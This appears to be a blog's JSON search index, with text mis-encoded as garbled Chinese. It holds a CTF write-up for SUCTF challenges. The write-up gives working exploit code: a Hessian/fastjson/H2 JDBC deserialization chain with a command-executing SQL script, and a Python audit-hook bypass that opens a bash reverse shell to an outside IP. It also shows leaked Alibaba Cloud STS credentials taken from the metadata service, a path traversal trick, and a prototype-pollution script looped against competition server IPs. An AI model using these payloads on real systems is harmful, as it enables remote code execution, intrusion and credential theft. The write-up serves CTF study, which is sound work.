[{"categories":null,"contents":" 1231 456 å‹é“¾åç§°2 å‹é“¾æè¿°2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"å‹é“¾"},{"categories":null,"contents":"ä¸€åå¤§äºŒåœ¨è¯»å­¦ç”Ÿ\nSyclover \u0026amp; 0XFFF æˆå‘˜\nå¯¹å„ç§å®‰å…¨æ„Ÿå…´è¶£ï¼Œç›®å‰ä¸»è¦å­¦ä¹ çš„è¿˜çš„æ˜¯Webå®‰å…¨ï¼ˆJava å®‰å…¨ã€äº‘å®‰å…¨ç­‰ï¼‰\næœ€çˆ±åƒï¼Œæœ€å–œæ¬¢åƒçš„æ˜¯ğŸ‰ï¼Œæœ€å–œæ¬¢å¹²çš„äº‹æƒ…å°±æ˜¯å¤§å¤å¤©æŠ±ç€åŠä¸ªè¥¿ç“œæ‹¿å‹ºå­æŒ–ç€åƒç„¶åçœ‹è§†é¢‘\nä¼šæ‰“ç‚¹å°æ¸¸æˆï¼ˆå…¶å®ä»å°å­¦ä¹‹å‰å°±å¼€å§‹æ‰“æ¸¸æˆäº†hh\nä»€ä¹ˆéƒ½æƒ³å­¦ï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼š\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon 